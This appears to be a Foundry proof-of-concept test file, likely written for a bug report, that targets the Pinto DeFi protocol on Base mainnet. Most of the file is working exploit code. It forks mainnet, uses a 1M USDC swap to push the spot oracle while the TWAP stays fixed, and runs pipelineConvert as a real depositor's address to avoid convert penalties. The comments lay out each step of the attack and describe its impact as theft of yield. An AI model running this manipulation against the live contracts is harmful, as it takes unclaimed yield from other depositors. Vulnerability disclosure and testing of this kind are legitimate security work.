// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

struct AdvancedPipeCall {
    address target;
    bytes callData;
    bytes clipboard;
}

struct Deposit {
    uint128 amount;
    uint128 bdv;
}

struct TokenDepositId {
    address token;
    uint256[] depositIds;
    Deposit[] tokenDeposits;
}

interface IPinto {
    function overallCappedDeltaB() external view returns (int256);
    function overallCurrentDeltaB() external view returns (int256);
    function balanceOfStalk(address account) external view returns (uint256);
    function grownStalkForDeposit(address account, address token, int96 stem) external view returns (uint256);
    function getTokenDepositsForAccount(address account, address token) external view returns (TokenDepositId memory);
    function getAddressAndStem(uint256 depositId) external pure returns (address token, int96 stem);
    function pipelineConvert(
        address inputToken,
        int96[] calldata stems,
        uint256[] calldata amounts,
        address outputToken,
        AdvancedPipeCall[] memory advancedPipeCalls
    ) external payable returns (int96 toStem, uint256 fromAmount, uint256 toAmount, uint256 fromBdv, uint256 toBdv);
}

interface IWell {
    function swapFrom(address fromToken, address toToken, uint256 amountIn, uint256 minAmountOut, address recipient, uint256 deadline) external returns (uint256);
    function tokens() external view returns (address[] memory);
    function addLiquidity(uint256[] calldata tokenAmountsIn, uint256 minLpAmountOut, address recipient, uint256 deadline) external returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

/**
 * @title TWAP/SPOT Oracle Discrepancy PoC
 * @notice Demonstrates how an attacker can bypass convert penalties by manipulating the spot oracle
 * 
 * @dev Vulnerability Summary:
 * - Convert capacity uses TWAP (overallCappedDeltaB)
 * - Penalty calculation uses SPOT (overallCurrentDeltaB) 
 * - Attacker can flash-manipulate SPOT while TWAP remains unchanged
 * - This makes penalty calculation see favorable movement, reducing/avoiding penalty
 * 
 * Attack Flow:
 * 1. Flash swap to manipulate SPOT oracle (push towards peg)
 * 2. Execute pipelineConvert - beforeDeltaB captures manipulated state
 * 3. Convert moves pool, afterDeltaB reflects actual state
 * 4. Penalty calculation sees "towards peg" movement due to manipulated beforeDeltaB
 * 5. Attacker preserves more grown stalk than without manipulation
 * 6. Swap back, only paying ~0.3% swap fees
 * 
 * Impact: Theft of unclaimed yield through stalk dilution
 */
contract OracleManipulationPoC is Test {
    // Base Mainnet
    address constant PINTO_DIAMOND = 0xD1A0D188E861ed9d15773a2F3574a2e94134bA8f;
    address constant PINTO_USDC_WELL = 0x3e1133aC082716DDC3114bbEFEeD8B1731eA9cb1;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant PINTO_TOKEN = 0xb170000aeeFa790fa61D6e837d1035906839a3c8;
    address constant PIPELINE = 0xb1bE0001f5a373b69b1E132b420e6D9687155e80;
    address constant DEPOSITOR = 0x56c7B85aE9f97b93bD19B98176927eeF63D039BE;
    
    IPinto pinto;
    
    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org");
        pinto = IPinto(PINTO_DIAMOND);
    }

    /**
     * @notice Verifies that SPOT can be manipulated while TWAP remains unchanged
     */
    function test_oracleDiscrepancy() public {
        int256 twapBefore = pinto.overallCappedDeltaB();
        int256 spotBefore = pinto.overallCurrentDeltaB();

        _doLargeSwap(1_000_000e6);
        
        int256 twapAfter = pinto.overallCappedDeltaB();
        int256 spotAfter = pinto.overallCurrentDeltaB();
        
        emit log_named_int("TWAP change", twapAfter - twapBefore);
        emit log_named_int("SPOT change", spotAfter - spotBefore);
        
        assertEq(twapAfter, twapBefore, "TWAP should not change");
        assertTrue(spotAfter != spotBefore, "SPOT should change");
    }

    /**
     * @notice Full exploit: compares stalk outcome of normal vs manipulated convert
     * @dev Expected result: Manipulated convert preserves more stalk
     */
    function test_fullExploit() public {
        console.log("=== TWAP/SPOT Oracle Manipulation PoC ===");
        
        TokenDepositId memory deposits = pinto.getTokenDepositsForAccount(DEPOSITOR, PINTO_TOKEN);
        require(deposits.depositIds.length > 0, "No Bean deposits");
        
        (,int96 stem) = pinto.getAddressAndStem(deposits.depositIds[0]);
        uint256 amount = uint256(deposits.tokenDeposits[0].amount);
        
        console.log("Bean Amount:", amount);
        
        uint256 snapshotId = vm.snapshot();
        
        // Scenario A: Normal convert without manipulation
        uint256 stalkAfterA = _runNormalConvert(stem, amount);
        
        vm.revertTo(snapshotId);
        
        // Scenario B: Convert after SPOT manipulation
        uint256 stalkAfterB = _runManipulatedConvert(stem, amount);
        
        // Analysis
        console.log("");
        console.log("=== RESULTS ===");
        console.log("Normal Convert Stalk:", stalkAfterA);
        console.log("Manipulated Convert Stalk:", stalkAfterB);
        
        if (stalkAfterB > stalkAfterA) {
            console.log("");
            console.log("[VULNERABILITY CONFIRMED]");
            console.log("Stalk Advantage:", stalkAfterB - stalkAfterA);
        }
    }
    
    function _runNormalConvert(int96 stem, uint256 amount) internal returns (uint256 stalkAfter) {
        console.log("");
        console.log("--- Scenario A: Normal Convert ---");
        
        uint256 stalkBefore = pinto.balanceOfStalk(DEPOSITOR);
        uint256 grownStalk = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_TOKEN, stem);
        
        console.log("Stalk Before:", stalkBefore);
        console.log("Grown Stalk:", grownStalk);
        console.log("TWAP:"); console.logInt(pinto.overallCappedDeltaB());
        console.log("SPOT:"); console.logInt(pinto.overallCurrentDeltaB());
        
        _doConvert(stem, amount);
        
        stalkAfter = pinto.balanceOfStalk(DEPOSITOR);
        console.log("Stalk After:", stalkAfter);
    }
    
    function _runManipulatedConvert(int96 stem, uint256 amount) internal returns (uint256 stalkAfter) {
        console.log("");
        console.log("--- Scenario B: Manipulated Convert ---");
        
        uint256 stalkBefore = pinto.balanceOfStalk(DEPOSITOR);
        int256 twapBefore = pinto.overallCappedDeltaB();
        int256 spotBefore = pinto.overallCurrentDeltaB();
        
        console.log("Stalk Before:", stalkBefore);
        console.log("TWAP:"); console.logInt(twapBefore);
        console.log("SPOT:"); console.logInt(spotBefore);
        
        // Manipulate SPOT oracle
        console.log("");
        console.log(">>> Swap 1M USDC -> Pinto <<<");
        _doLargeSwap(1_000_000e6);
        
        int256 spotAfter = pinto.overallCurrentDeltaB();
        console.log("SPOT after manipulation:"); console.logInt(spotAfter);
        console.log("SPOT change:"); console.logInt(spotAfter - spotBefore);
        
        // Convert with manipulated oracle
        console.log("");
        console.log(">>> Execute Convert <<<");
        _doConvert(stem, amount);
        
        stalkAfter = pinto.balanceOfStalk(DEPOSITOR);
        console.log("Stalk After:", stalkAfter);
    }

    function _doLargeSwap(uint256 usdcAmount) internal {
        address[] memory tokens = IWell(PINTO_USDC_WELL).tokens();
        address pintoToken = tokens[0] == USDC ? tokens[1] : tokens[0];
        
        deal(USDC, address(this), usdcAmount);
        IERC20(USDC).approve(PINTO_USDC_WELL, type(uint256).max);
        IWell(PINTO_USDC_WELL).swapFrom(USDC, pintoToken, usdcAmount, 0, address(this), block.timestamp);
    }

    function _doConvert(int96 stem, uint256 amount) internal {
        AdvancedPipeCall[] memory pipeCalls = _createPipeCalls(amount);
        
        int96[] memory stems = new int96[](1);
        stems[0] = stem;
        
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        
        vm.prank(DEPOSITOR);
        try pinto.pipelineConvert(PINTO_TOKEN, stems, amounts, PINTO_USDC_WELL, pipeCalls) {
            console.log("Convert successful");
        } catch Error(string memory reason) {
            console.log("Convert failed:", reason);
        }
    }

    function _createPipeCalls(uint256 beanAmount) internal pure returns (AdvancedPipeCall[] memory) {
        bytes memory approveData = abi.encodeWithSelector(
            IERC20.approve.selector,
            PINTO_USDC_WELL,
            type(uint256).max
        );
        
        uint256[] memory tokenAmounts = new uint256[](2);
        tokenAmounts[0] = beanAmount;
        tokenAmounts[1] = 0;
        
        bytes memory addLiquidityData = abi.encodeWithSelector(
            IWell.addLiquidity.selector,
            tokenAmounts,
            0,
            PIPELINE,
            type(uint256).max
        );
        
        AdvancedPipeCall[] memory calls = new AdvancedPipeCall[](2);
        calls[0] = AdvancedPipeCall(PINTO_TOKEN, approveData, abi.encode(0));
        calls[1] = AdvancedPipeCall(PINTO_USDC_WELL, addLiquidityData, abi.encode(0));
        
        return calls;
    }
}